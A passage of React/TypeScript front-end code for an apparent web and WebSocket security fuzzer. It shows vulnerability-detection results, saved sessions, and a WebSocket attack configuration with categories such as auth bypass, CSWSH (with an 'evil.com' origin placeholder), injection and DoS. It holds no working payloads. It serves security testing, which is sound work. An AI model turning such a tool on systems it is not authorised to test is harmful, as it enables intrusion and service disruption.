                        <BugReportIcon color="primary" sx={{ fontSize: 32 }} />
                        Smart Vulnerability Detection
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ mt: 0.5 }}>
                        AI-powered analysis using 50+ detection signatures
                      </Typography>
                    </Box>
                    <Box sx={{ display: "flex", gap: 1 }}>
                      <Button
                        variant="contained"
                        color="primary"
                        size="large"
                        startIcon={runningSmartDetection ? <CircularProgress size={20} color="inherit" /> : <AutoFixHighIcon />}
                        onClick={runSmartDetection}
                        disabled={results.length === 0 || runningSmartDetection}
                        sx={{ px: 3, py: 1.5, borderRadius: 2 }}
                      >
                        {runningSmartDetection ? "Analyzing..." : "Run Full Analysis"}
                      </Button>
                      {smartDetectionResults && (
                        <Button
                          variant="outlined"
                          color="secondary"
                          size="large"
                          startIcon={<DescriptionIcon />}
                          onClick={() => setShowWrittenReportDialog(true)}
                          sx={{ px: 3, py: 1.5, borderRadius: 2 }}
                        >
                          View Written Report
                        </Button>
                      )}
                    </Box>
                  </Box>
                  
                  {results.length === 0 ? (
                    <Alert severity="info" icon={<InfoIcon />} sx={{ borderRadius: 2 }}>
                      <Typography variant="body2">
                        Run a fuzzing session first to analyze responses. Smart detection will automatically identify potential vulnerabilities including SQL injection, XSS, command injection, path traversal, and more.
                      </Typography>
                    </Alert>
                  ) : (
                    <Box sx={{ display: "flex", gap: 2, alignItems: "center", bgcolor: alpha(theme.palette.background.paper, 0.6), p: 2, borderRadius: 2 }}>
                      <Chip icon={<AssessmentIcon />} label={`${results.length} responses ready`} color="primary" variant="outlined" />
                      <Typography variant="body2" color="text.secondary">
                        Detection covers: SQL injection • XSS • Command injection • Path traversal • SSTI • XXE • Information disclosure
                      </Typography>
                    </Box>
                  )}
                </CardContent>
              </Card>
            </Grid>

            {/* Detection Summary */}
            {smartDetectionResults && (
              <>
                {/* Risk Score Card */}
                <Grid item xs={12} md={4}>
                  <Card sx={{ 
                    height: "100%",
                    background: smartDetectionResults.summary?.risk_level === "critical" 
                      ? `linear-gradient(135deg, ${alpha(theme.palette.error.main, 0.15)} 0%, ${alpha(theme.palette.error.dark, 0.1)} 100%)`
                      : smartDetectionResults.summary?.risk_level === "high"
                      ? `linear-gradient(135deg, ${alpha(theme.palette.warning.main, 0.15)} 0%, ${alpha(theme.palette.warning.dark, 0.1)} 100%)`
                      : `linear-gradient(135deg, ${alpha(theme.palette.success.main, 0.1)} 0%, ${alpha(theme.palette.success.dark, 0.05)} 100%)`
                  }}>
                    <CardContent sx={{ textAlign: "center", py: 4 }}>
                      <Typography variant="overline" color="text.secondary" fontWeight={600}>Overall Risk Score</Typography>
                      <Box sx={{ position: "relative", display: "inline-flex", my: 2 }}>
                        <CircularProgress
                          variant="determinate"
                          value={smartDetectionResults.summary?.risk_score || 0}
                          size={140}
                          thickness={6}
                          sx={{ 
                            color: smartDetectionResults.summary?.risk_score >= 70 ? "error.main" :
                              smartDetectionResults.summary?.risk_score >= 40 ? "warning.main" :
                              smartDetectionResults.summary?.risk_score >= 20 ? "info.main" : "success.main"
                          }}
                        />
                        <Box sx={{ position: "absolute", top: 0, left: 0, bottom: 0, right: 0, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column" }}>
                          <Typography variant="h2" fontWeight={800} color={
                            smartDetectionResults.summary?.risk_score >= 70 ? "error.main" :
                            smartDetectionResults.summary?.risk_score >= 40 ? "warning.main" :
                            smartDetectionResults.summary?.risk_score >= 20 ? "info.main" : "success.main"
                          }>
                            {smartDetectionResults.summary?.risk_score || 0}
                          </Typography>
                        </Box>
                      </Box>
                      <Chip 
                        label={smartDetectionResults.summary?.risk_level?.toUpperCase() || "SAFE"} 
                        size="medium"
                        icon={smartDetectionResults.summary?.risk_level === "critical" ? <ErrorIcon /> : smartDetectionResults.summary?.risk_level === "high" ? <WarningAmberIcon /> : <CheckCircleIcon />}
                        color={
                          smartDetectionResults.summary?.risk_level === "critical" ? "error" :
                          smartDetectionResults.summary?.risk_level === "high" ? "warning" :
                          smartDetectionResults.summary?.risk_level === "medium" ? "info" : "success"
                        }
                        sx={{ fontWeight: 700, px: 2 }}
                      />
                    </CardContent>
                  </Card>
                </Grid>

                {/* Stats Cards */}
                <Grid item xs={12} md={8}>
                  <Grid container spacing={2} sx={{ height: "100%" }}>
                    <Grid item xs={6} sm={4}>
                      <Card sx={{ height: "100%", bgcolor: alpha(theme.palette.error.main, 0.05) }}>
                        <CardContent sx={{ textAlign: "center" }}>
                          <BugReportIcon sx={{ fontSize: 40, color: "error.main", mb: 1 }} />
                          <Typography variant="h3" fontWeight={700} color="error.main">
                            {smartDetectionResults.summary?.findings_count || 0}
                          </Typography>
                          <Typography variant="body2" color="text.secondary">Vulnerabilities</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                    <Grid item xs={6} sm={4}>
                      <Card sx={{ height: "100%", bgcolor: alpha(theme.palette.warning.main, 0.05) }}>
                        <CardContent sx={{ textAlign: "center" }}>
                          <WarningAmberIcon sx={{ fontSize: 40, color: "warning.main", mb: 1 }} />
                          <Typography variant="h3" fontWeight={700} color="warning.main">
                            {smartDetectionResults.summary?.anomalies_count || 0}
                          </Typography>
                          <Typography variant="body2" color="text.secondary">Anomalies</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                    <Grid item xs={6} sm={4}>
                      <Card sx={{ height: "100%", bgcolor: alpha(theme.palette.info.main, 0.05) }}>
                        <CardContent sx={{ textAlign: "center" }}>
                          <SearchIcon sx={{ fontSize: 40, color: "info.main", mb: 1 }} />
                          <Typography variant="h3" fontWeight={700} color="info.main">
                            {smartDetectionResults.summary?.interesting_count || 0}
                          </Typography>
                          <Typography variant="body2" color="text.secondary">Interesting</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                    {/* Severity Breakdown */}
                    <Grid item xs={12}>
                      <Card sx={{ height: "100%" }}>
                        <CardContent>
                          <Typography variant="subtitle2" fontWeight={600} gutterBottom>Severity Distribution</Typography>
                          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                            {smartDetectionResults.vulnerabilities?.by_severity && Object.entries(smartDetectionResults.vulnerabilities.by_severity).map(([severity, count]) => (
                              <Chip
                                key={severity}
                                label={`${severity.charAt(0).toUpperCase() + severity.slice(1)}: ${count}`}
                                size="small"
                                color={
                                  severity === "critical" ? "error" :
                                  severity === "high" ? "warning" :
                                  severity === "medium" ? "info" : "default"
                                }
                                variant={count as number > 0 ? "filled" : "outlined"}
                                sx={{ fontWeight: 600 }}
                              />
                            ))}
                          </Box>
                        </CardContent>
                      </Card>
                    </Grid>
                  </Grid>
                </Grid>

                {/* Categories */}
                {Object.keys(responseCategories).length > 0 && (
                  <Grid item xs={12}>
                    <Card>
                      <CardContent>
                        <Typography variant="subtitle1" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                          <CategoryIcon color="action" />
                          Response Categories
                        </Typography>
                        <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                          {Object.entries(responseCategories).map(([category, ids]) => (
                            <Chip
                              key={category}
                              label={`${category.replace(/_/g, " ")}: ${ids.length}`}
                              color={
                                category === "server_error" ? "error" :
                                category === "blocked" ? "warning" :
                                category === "interesting" ? "secondary" :
                                category === "success" ? "success" : "default"
                              }
                              variant="outlined"
                              sx={{ textTransform: "capitalize" }}
                            />
                          ))}
                        </Box>
                      </CardContent>
                    </Card>
                  </Grid>
                )}
              </>
            )}

            {/* Vulnerability Findings */}
            {vulnerabilityFindings.length > 0 && (
              <Grid item xs={12}>
                <Card>
                  <CardContent>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
                      <Typography variant="h6" fontWeight={600} sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                        <ErrorIcon color="error" />
                        Vulnerability Findings ({vulnerabilityFindings.length})
                      </Typography>
                      <Chip 
                        label="Click to expand details" 
                        size="small" 
                        variant="outlined" 
                        icon={<ExpandMoreIcon />}
                      />
                    </Box>
                    <Box sx={{ display: "flex", flexDirection: "column", gap: 1 }}>
                      {vulnerabilityFindings.map((finding, idx) => (
                        <Accordion 
                          key={finding.id || idx}
                          sx={{ 
                            border: `1px solid ${
                              finding.severity === "critical" ? theme.palette.error.main :
                              finding.severity === "high" ? theme.palette.warning.main :
                              theme.palette.divider
                            }`,
                            "&:before": { display: "none" },
                            borderRadius: "8px !important",
                            overflow: "hidden",
                          }}
                        >
                          <AccordionSummary 
                            expandIcon={<ExpandMoreIcon />}
                            sx={{ 
                              bgcolor: finding.severity === "critical" ? alpha(theme.palette.error.main, 0.05) :
                                finding.severity === "high" ? alpha(theme.palette.warning.main, 0.05) : undefined
                            }}
                          >
                            <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%", flexWrap: "wrap" }}>
                              <Chip
                                label={finding.severity?.toUpperCase()}
                                size="small"
                                color={
                                  finding.severity === "critical" ? "error" :
                                  finding.severity === "high" ? "warning" :
                                  finding.severity === "medium" ? "info" : "default"
                                }
                                sx={{ fontWeight: 700, minWidth: 80 }}
                              />
                              <Typography variant="subtitle1" fontWeight={600} sx={{ flex: 1 }}>
                                {finding.title}
                              </Typography>
                              <Box sx={{ display: "flex", gap: 1, alignItems: "center" }}>
                                <LinearProgress 
                                  variant="determinate" 
                                  value={(finding.confidence || 0) * 100}
                                  sx={{ width: 60, height: 6, borderRadius: 3 }}
                                  color={finding.confidence > 0.8 ? "success" : finding.confidence > 0.5 ? "warning" : "error"}
                                />
                                <Typography variant="caption" color="text.secondary" sx={{ minWidth: 35 }}>
                                  {Math.round((finding.confidence || 0) * 100)}%
                                </Typography>
                              </Box>
                              <Chip 
                                label={finding.vuln_type?.replace(/_/g, " ")} 
                                size="small" 
                                variant="outlined"
                                sx={{ textTransform: "capitalize" }}
                              />
                            </Box>
                          </AccordionSummary>
                          <AccordionDetails sx={{ bgcolor: alpha(theme.palette.background.default, 0.5) }}>
                            <Grid container spacing={2}>
                              <Grid item xs={12}>
                                <Alert severity="info" variant="outlined" sx={{ borderRadius: 2 }}>
                                  {finding.description}
                                </Alert>
                              </Grid>
                              <Grid item xs={12} md={6}>
                                <Typography variant="overline" color="text.secondary">Payload Used</Typography>
                                <Paper variant="outlined" sx={{ p: 1.5, mt: 0.5, bgcolor: "#1e1e1e", borderRadius: 2 }}>
                                  <Typography sx={{ fontFamily: "monospace", fontSize: "0.85rem", color: "#d4d4d4", wordBreak: "break-all" }}>
                                    {finding.payload}
                                  </Typography>
                                </Paper>
                              </Grid>
                              <Grid item xs={12} md={6}>
                                <Typography variant="overline" color="text.secondary">Evidence Found</Typography>
                                <Box sx={{ mt: 0.5, display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                                  {finding.evidence?.slice(0, 3).map((ev: string, i: number) => (
                                    <Chip key={i} label={ev.slice(0, 50)} size="small" variant="outlined" sx={{ mr: 0.5, mb: 0.5 }} />
                                  ))}
                                </Box>
                              </Grid>
                              <Grid item xs={12}>
                                <Paper sx={{ p: 2, bgcolor: alpha(theme.palette.success.main, 0.05), borderRadius: 2 }}>
                                  <Typography variant="overline" color="success.main" fontWeight={600} sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                                    <TipsAndUpdatesIcon fontSize="small" />
                                    Recommendation
                                  </Typography>
                                  <Typography variant="body2">{finding.recommendation}</Typography>
                                </Paper>
                              </Grid>
                              <Grid item xs={12}>
                                <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                                  <Chip 
                                    label={`FP Risk: ${finding.false_positive_likelihood}`}
                                    size="small"
                                    icon={finding.false_positive_likelihood === "high" ? <WarningAmberIcon /> : <CheckCircleIcon />}
                                    color={finding.false_positive_likelihood === "high" ? "warning" : "success"}
                                    variant="outlined"
                                  />
                                  <Chip 
                                    label={`View Response ${finding.response_id?.slice(0, 8)}`}
                                    size="small"
                                    icon={<VisibilityIcon />}
                                    variant="outlined"
                                    clickable
                                    onClick={() => {
                                      const result = results.find(r => r.id === finding.response_id);
                                      if (result) viewResponseDetails(result);
                                    }}
                                  />
                                </Box>
                              </Grid>
                            </Grid>
                          </AccordionDetails>
                        </Accordion>
                      ))}
                    </Box>
                  </CardContent>
                </Card>
              </Grid>
            )}

            {/* Anomalies */}
            {anomalyResults.length > 0 && (
              <Grid item xs={12}>
                <Card>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                      <WarningAmberIcon color="warning" />
                      Anomalous Responses ({anomalyResults.length})
                    </Typography>
                    <TableContainer>
                      <Table size="small">
                        <TableHead>
                          <TableRow>
                            <TableCell>Response</TableCell>
                            <TableCell>Type</TableCell>
                            <TableCell>Score</TableCell>
                            <TableCell>Baseline</TableCell>
                            <TableCell>Actual</TableCell>
                            <TableCell>Description</TableCell>
                          </TableRow>
                        </TableHead>
                        <TableBody>
                          {anomalyResults.slice(0, 20).map((anomaly, idx) => (
                            <TableRow 
                              key={idx}
                              sx={{ 
                                bgcolor: anomaly.score > 0.8 ? alpha(theme.palette.warning.main, 0.1) : undefined,
                                cursor: "pointer",
                              }}
                              onClick={() => {
                                const result = results.find(r => r.id === anomaly.response_id);
                                if (result) viewResponseDetails(result);
                              }}
                            >
                              <TableCell sx={{ fontFamily: "monospace" }}>{anomaly.response_id?.slice(0, 8)}</TableCell>
                              <TableCell>
                                <Chip label={anomaly.anomaly_type} size="small" />
                              </TableCell>
                              <TableCell>
                                <LinearProgress 
                                  variant="determinate" 
                                  value={anomaly.score * 100} 
                                  color={anomaly.score > 0.8 ? "error" : anomaly.score > 0.5 ? "warning" : "info"}
                                  sx={{ width: 60, mr: 1, display: "inline-block", verticalAlign: "middle" }}
                                />
                                {Math.round(anomaly.score * 100)}%
                              </TableCell>
                              <TableCell>{anomaly.baseline_value}</TableCell>
                              <TableCell sx={{ fontWeight: 600 }}>{anomaly.actual_value}</TableCell>
                              <TableCell sx={{ maxWidth: 300 }}>
                                <Typography variant="caption">{anomaly.description}</Typography>
                              </TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </TableContainer>
                  </CardContent>
                </Card>
              </Grid>
            )}
          </Grid>
        </Box>
      )}

      {/* Tab 7: Sessions */}
      {activeTab === 7 && (
        <Box>
          <Grid container spacing={3}>
            {/* Session Controls */}
            <Grid item xs={12}>
              <Card sx={{ background: `linear-gradient(135deg, ${alpha(theme.palette.primary.main, 0.05)} 0%, ${alpha(theme.palette.secondary.main, 0.05)} 100%)` }}>
                <CardContent>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 3 }}>
                    <Box>
                      <Typography variant="h5" fontWeight={700} sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                        <FolderIcon color="primary" sx={{ fontSize: 32 }} />
                        Fuzzing Sessions
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ mt: 0.5 }}>
                        Save, load, and manage your fuzzing configurations and results
                      </Typography>
                    </Box>
                    <Box sx={{ display: "flex", gap: 1 }}>
                      <Button
                        variant="outlined"
                        startIcon={sessionsLoading ? <CircularProgress size={16} /> : <RefreshIcon />}
                        onClick={loadSessions}
                        disabled={sessionsLoading}
                      >
                        Refresh
                      </Button>
                      <Button
                        variant="contained"
                        size="large"
                        startIcon={<SaveIcon />}
                        onClick={() => setSaveSessionDialog(true)}
                        disabled={results.length === 0}
                        sx={{ px: 3 }}
                      >
                        Save Current Session
                      </Button>
                    </Box>
                  </Box>

                  {/* Filters */}
                  <Box sx={{ display: "flex", gap: 2, bgcolor: alpha(theme.palette.background.paper, 0.6), p: 2, borderRadius: 2 }}>
                    <TextField
                      size="small"
                      placeholder="Search sessions by name or URL..."
                      value={sessionSearch}
                      onChange={(e) => setSessionSearch(e.target.value)}
                      InputProps={{
                        startAdornment: <SearchIcon fontSize="small" sx={{ mr: 1, color: "text.secondary" }} />,
                      }}
                      sx={{ flex: 1, maxWidth: 400 }}
                    />
                    <FormControl size="small" sx={{ minWidth: 150 }}>
                      <InputLabel>Status</InputLabel>
                      <Select
                        value={sessionStatusFilter}
                        label="Status"
                        onChange={(e) => setSessionStatusFilter(e.target.value)}
                      >
                        <MenuItem value="">All Statuses</MenuItem>
                        <MenuItem value="created">Created</MenuItem>
                        <MenuItem value="running">Running</MenuItem>
                        <MenuItem value="completed">Completed</MenuItem>
                        <MenuItem value="failed">Failed</MenuItem>
                      </Select>
                    </FormControl>
                    <Chip label={`${sessionsTotal} total sessions`} variant="outlined" />
                  </Box>
                </CardContent>
              </Card>
            </Grid>

            {/* Sessions List */}
            <Grid item xs={12}>
              {sessionsLoading ? (
                <Box sx={{ display: "flex", justifyContent: "center", alignItems: "center", flexDirection: "column", p: 6 }}>
                  <CircularProgress size={48} />
                  <Typography variant="body2" color="text.secondary" sx={{ mt: 2 }}>Loading sessions...</Typography>
                </Box>
              ) : sessions.length === 0 ? (
                <Card sx={{ textAlign: "center", py: 6 }}>
                  <CardContent>
                    <FolderOpenIcon sx={{ fontSize: 64, color: "text.disabled", mb: 2 }} />
                    <Typography variant="h6" color="text.secondary" gutterBottom>No Sessions Found</Typography>
                    <Typography variant="body2" color="text.disabled" sx={{ mb: 3 }}>
                      {sessionSearch || sessionStatusFilter 
                        ? "No sessions match your current filters. Try adjusting your search criteria."
                        : "You haven't saved any fuzzing sessions yet. Run a fuzzing session and click \"Save Current Session\" to save it."}
                    </Typography>
                    {!sessionSearch && !sessionStatusFilter && (
                      <Button
                        variant="outlined"
                        startIcon={<PlayArrowIcon />}
                        onClick={() => setActiveTab(0)}
                      >
                        Start Fuzzing
                      </Button>
                    )}
                  </CardContent>
                </Card>
              ) : (
                <TableContainer component={Paper} sx={{ borderRadius: 2 }}>
                  <Table>
                    <TableHead>
                      <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.05) }}>
                        <TableCell sx={{ fontWeight: 600 }}>Name</TableCell>
                        <TableCell sx={{ fontWeight: 600 }}>Target</TableCell>
                        <TableCell sx={{ fontWeight: 600 }}>Status</TableCell>
                        <TableCell sx={{ fontWeight: 600 }}>Requests</TableCell>
                        <TableCell sx={{ fontWeight: 600 }}>Findings</TableCell>
                        <TableCell sx={{ fontWeight: 600 }}>Created</TableCell>
                        <TableCell sx={{ fontWeight: 600 }}>Actions</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {sessions.map((session) => (
                        <TableRow 
                          key={session.id} 
                          hover
                          sx={{ 
                            "&:hover": { bgcolor: alpha(theme.palette.primary.main, 0.02) },
                            cursor: "pointer",
                          }}
                        >
                          <TableCell>
                            <Box>
                              <Typography variant="subtitle2" fontWeight={600}>{session.name}</Typography>
                              {session.description && (
                                <Typography variant="caption" color="text.secondary" sx={{ display: "block", maxWidth: 200, overflow: "hidden", textOverflow: "ellipsis" }}>
                                  {session.description}
                                </Typography>
                              )}
                            </Box>
                          </TableCell>
                          <TableCell>
                            <Tooltip title={session.target_url}>
                              <Typography variant="body2" sx={{ fontFamily: "monospace", maxWidth: 200, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                                {session.target_url}
                              </Typography>
                            </Tooltip>
                          </TableCell>
                          <TableCell>
                            <Chip
                              label={session.status}
                              size="small"
                              color={
                                session.status === "completed" ? "success" :
                                session.status === "running" ? "info" :
                                session.status === "failed" ? "error" : "default"
                              }
                              sx={{ fontWeight: 600, textTransform: "capitalize" }}
                            />
                          </TableCell>
                          <TableCell>
                            <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                              <Typography variant="body2" fontWeight={500}>{session.total_requests || 0}</Typography>
                              {session.interesting_count > 0 && (
                                <Chip 
                                  label={`${session.interesting_count} interesting`}
                                  size="small" 
                                  color="warning" 
                                  variant="outlined"
                                  sx={{ height: 20, fontSize: "0.7rem" }}
                                />
                              )}
                            </Box>
                          </TableCell>
                          <TableCell>
                            <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                              <Badge badgeContent={session.findings_count} color="error" max={99}>
                                <BugReportIcon color={session.findings_count > 0 ? "error" : "disabled"} fontSize="small" />
                              </Badge>
                              {session.findings_count > 0 && (
                                <Typography variant="caption" color="error.main" fontWeight={600}>
                                  {session.findings_count}
                                </Typography>
                              )}
                            </Box>
                          </TableCell>
                          <TableCell>
                            <Box>
                              <Typography variant="caption" fontWeight={500}>
                                {session.created_at ? new Date(session.created_at).toLocaleDateString() : "-"}
                              </Typography>
                              <Typography variant="caption" color="text.disabled" sx={{ display: "block" }}>
                                {session.created_at ? new Date(session.created_at).toLocaleTimeString() : ""}
                              </Typography>
                            </Box>
                          </TableCell>
                          <TableCell>
                            <Box sx={{ display: "flex", gap: 0.5 }}>
                              <Tooltip title="Load Session">
                                <IconButton 
                                  size="small" 
                                  onClick={() => loadSession(session.id)}
                                  sx={{ 
                                    bgcolor: alpha(theme.palette.primary.main, 0.1),
                                    "&:hover": { bgcolor: alpha(theme.palette.primary.main, 0.2) }
                                  }}
                                >
                                  <FolderOpenIcon fontSize="small" color="primary" />
                                </IconButton>
                              </Tooltip>
                              <Tooltip title="Duplicate">
                                <IconButton 
                                  size="small" 
                                  onClick={() => duplicateSession(session.id)}
                                  sx={{ 
                                    bgcolor: alpha(theme.palette.info.main, 0.1),
                                    "&:hover": { bgcolor: alpha(theme.palette.info.main, 0.2) }
                                  }}
                                >
                                  <ContentCopyIcon fontSize="small" color="info" />
                                </IconButton>
                              </Tooltip>
                              <Tooltip title="Delete">
                                <IconButton 
                                  size="small" 
                                  onClick={() => deleteSession(session.id)}
                                  sx={{ 
                                    bgcolor: alpha(theme.palette.error.main, 0.1),
                                    "&:hover": { bgcolor: alpha(theme.palette.error.main, 0.2) }
                                  }}
                                >
                                  <DeleteIcon fontSize="small" color="error" />
                                </IconButton>
                              </Tooltip>
                            </Box>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
              )}

              {/* Pagination */}
              {sessionsTotal > 10 && (
                <Box sx={{ display: "flex", justifyContent: "center", mt: 2 }}>
                  <ButtonGroup>
                    <Button 
                      disabled={sessionsPage === 1}
                      onClick={() => setSessionsPage(p => p - 1)}
                    >
                      Previous
                    </Button>
                    <Button disabled>
                      Page {sessionsPage} of {Math.ceil(sessionsTotal / 10)}
                    </Button>
                    <Button 
                      disabled={sessionsPage >= Math.ceil(sessionsTotal / 10)}
                      onClick={() => setSessionsPage(p => p + 1)}
                    >
                      Next
                    </Button>
                  </ButtonGroup>
                </Box>
              )}
            </Grid>
          </Grid>
        </Box>
      )}

      {/* Tab 8: WebSocket Fuzzing */}
      {activeTab === 8 && (
        <Box>
          <Grid container spacing={3}>
            {/* WebSocket Configuration */}
            <Grid item xs={12} lg={5}>
              <Card sx={{ background: `linear-gradient(135deg, ${alpha("#06b6d4", 0.05)} 0%, ${alpha("#0891b2", 0.05)} 100%)` }}>
                <CardContent>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 3 }}>
                    <CableIcon color="info" sx={{ fontSize: 28 }} />
                    <Typography variant="h6" fontWeight={700}>WebSocket Deep Fuzzing</Typography>
                  </Box>
                  
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 3 }}>
                    Test WebSocket endpoints for authentication bypass, state manipulation, injection attacks, 
                    CSWSH, race conditions, and more.
                  </Typography>
                  
                  {/* Target URL */}
                  <TextField
                    fullWidth
                    label="WebSocket URL"
                    placeholder="wss://example.com/ws or ws://localhost:8080/socket"
                    value={wsConfig.targetUrl}
                    onChange={(e) => setWsConfig(prev => ({ ...prev, targetUrl: e.target.value }))}
                    sx={{ mb: 2 }}
                    InputProps={{
                      startAdornment: <CableIcon sx={{ mr: 1, color: "text.secondary" }} />,
                    }}
                  />
                  
                  {/* Auth Token */}
                  <Grid container spacing={2} sx={{ mb: 2 }}>
                    <Grid item xs={8}>
                      <TextField
                        fullWidth
                        size="small"
                        label="Auth Token (optional)"
                        placeholder="Bearer token or session ID"
                        value={wsConfig.authToken}
                        onChange={(e) => setWsConfig(prev => ({ ...prev, authToken: e.target.value }))}
                      />
                    </Grid>
                    <Grid item xs={4}>
                      <TextField
                        fullWidth
                        size="small"
                        label="Header Name"
                        value={wsConfig.authHeader}
                        onChange={(e) => setWsConfig(prev => ({ ...prev, authHeader: e.target.value }))}
                      />
                    </Grid>
                  </Grid>
                  
                  {/* Origin for CSWSH testing */}
                  <TextField
                    fullWidth
                    size="small"
                    label="Origin Header (for CSWSH testing)"
                    placeholder="https://evil.com"
                    value={wsConfig.origin}
                    onChange={(e) => setWsConfig(prev => ({ ...prev, origin: e.target.value }))}
                    sx={{ mb: 2 }}
                  />
                  
                  {/* Message Template */}
                  <TextField
                    fullWidth
                    multiline
                    rows={3}
                    label="Message Template (use FUZZ or §0§ as placeholder)"
                    placeholder='{"action": "FUZZ", "data": "test"}'
                    value={wsConfig.messageTemplate}
                    onChange={(e) => setWsConfig(prev => ({ ...prev, messageTemplate: e.target.value }))}
                    sx={{ mb: 2 }}
                  />
                  
                  {/* Initial Messages */}
                  <Typography variant="subtitle2" fontWeight={600} gutterBottom>
                    Initial Messages (establish state before testing)
                  </Typography>
                  <Box sx={{ display: "flex", gap: 1, mb: 1 }}>
                    <TextField
                      fullWidth
                      size="small"
                      placeholder='{"action": "login", "token": "..."}'
                      value={wsNewInitMsg}
                      onChange={(e) => setWsNewInitMsg(e.target.value)}
                      onKeyPress={(e) => {
                        if (e.key === "Enter" && wsNewInitMsg.trim()) {
                          setWsConfig(prev => ({ ...prev, initialMessages: [...prev.initialMessages, wsNewInitMsg.trim()] }));
                          setWsNewInitMsg("");
                        }
                      }}
                    />
                    <Button
                      variant="outlined"
                      onClick={() => {
                        if (wsNewInitMsg.trim()) {
                          setWsConfig(prev => ({ ...prev, initialMessages: [...prev.initialMessages, wsNewInitMsg.trim()] }));
                          setWsNewInitMsg("");
                        }
                      }}
                    >
                      Add
                    </Button>
                  </Box>
                  <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5, mb: 2, minHeight: 24 }}>
                    {wsConfig.initialMessages.map((msg, i) => (
                      <Chip
                        key={i}
                        label={msg.slice(0, 40) + (msg.length > 40 ? "..." : "")}
                        size="small"
                        onDelete={() => setWsConfig(prev => ({
                          ...prev,
                          initialMessages: prev.initialMessages.filter((_, idx) => idx !== i)
                        }))}
                      />
                    ))}
                  </Box>
                  
                  {/* Attack Categories */}
                  <Typography variant="subtitle2" fontWeight={600} gutterBottom>
                    Attack Categories
                  </Typography>
                  <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1, mb: 2 }}>
                    {[
                      { id: "all", label: "All", color: "primary" },
                      { id: "auth_bypass", label: "Auth Bypass", color: "error" },
                      { id: "state_manipulation", label: "State Manipulation", color: "warning" },
                      { id: "frame_injection", label: "Frame Injection", color: "info" },
                      { id: "message_tampering", label: "Injection Attacks", color: "error" },
                      { id: "race_condition", label: "Race Conditions", color: "warning" },
                      { id: "cswsh", label: "CSWSH", color: "error" },
                      { id: "protocol_violation", label: "Protocol Violations", color: "default" },
                      { id: "dos", label: "DoS", color: "warning" },
                    ].map((cat) => (
                      <Chip
                        key={cat.id}
                        label={cat.label}
                        color={wsConfig.attackCategories.includes(cat.id) ? cat.color as any : "default"}
                        variant={wsConfig.attackCategories.includes(cat.id) ? "filled" : "outlined"}
                        onClick={() => {
                          if (cat.id === "all") {
                            setWsConfig(prev => ({ ...prev, attackCategories: ["all"] }));
                          } else {
                            setWsConfig(prev => {
                              const cats = prev.attackCategories.filter(c => c !== "all");
                              if (cats.includes(cat.id)) {
                                return { ...prev, attackCategories: cats.filter(c => c !== cat.id) };
                              } else {
                                return { ...prev, attackCategories: [...cats, cat.id] };
                              }
                            });
                          }
                        }}
                        sx={{ cursor: "pointer" }}
                      />
                    ))}
                  </Box>
                  
                  {/* Timing Settings */}
                  <Grid container spacing={2} sx={{ mb: 2 }}>
                    <Grid item xs={4}>
                      <TextField
                        fullWidth
                        size="small"
                        type="number"
                        label="Timeout (ms)"
                        value={wsConfig.timeout}
                        onChange={(e) => setWsConfig(prev => ({ ...prev, timeout: parseInt(e.target.value) || 10000 }))}
                      />
                    </Grid>
                    <Grid item xs={4}>
                      <TextField
                        fullWidth
                        size="small"
                        type="number"
                        label="Delay (ms)"
                        value={wsConfig.delayBetweenTests}
                        onChange={(e) => setWsConfig(prev => ({ ...prev, delayBetweenTests: parseInt(e.target.value) || 100 }))}
                      />
                    </Grid>
                    <Grid item xs={4}>
                      <TextField
                        fullWidth
                        size="small"
                        type="number"
                        label="Max Responses"
                        value={wsConfig.maxMessagesPerTest}
                        onChange={(e) => setWsConfig(prev => ({ ...prev, maxMessagesPerTest: parseInt(e.target.value) || 10 }))}
                      />
                    </Grid>
                  </Grid>
                  
                  {/* Action Buttons */}
                  <Box sx={{ display: "flex", gap: 2 }}>
                    <Button
                      variant="contained"
                      size="large"
                      fullWidth
                      startIcon={wsIsRunning ? <CircularProgress size={20} color="inherit" /> : <PlayArrowIcon />}
                      onClick={async () => {
                        if (!wsConfig.targetUrl) return;
                        setWsIsRunning(true);
                        setWsResults([]);
                        setWsFindings([]);
                        setWsProgress({ current: 0, total: 0 });
                        try {
                          const response = await fetch("/api/fuzzer/websocket/stream", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                              target_url: wsConfig.targetUrl,
                              initial_messages: wsConfig.initialMessages,
                              auth_token: wsConfig.authToken || null,
                              auth_header: wsConfig.authHeader,
                              origin: wsConfig.origin || null,
                              subprotocols: wsConfig.subprotocols,
                              attack_categories: wsConfig.attackCategories,
                              custom_payloads: wsConfig.customPayloads,
                              message_template: wsConfig.messageTemplate,
                              timeout: wsConfig.timeout,
                              delay_between_tests: wsConfig.delayBetweenTests,
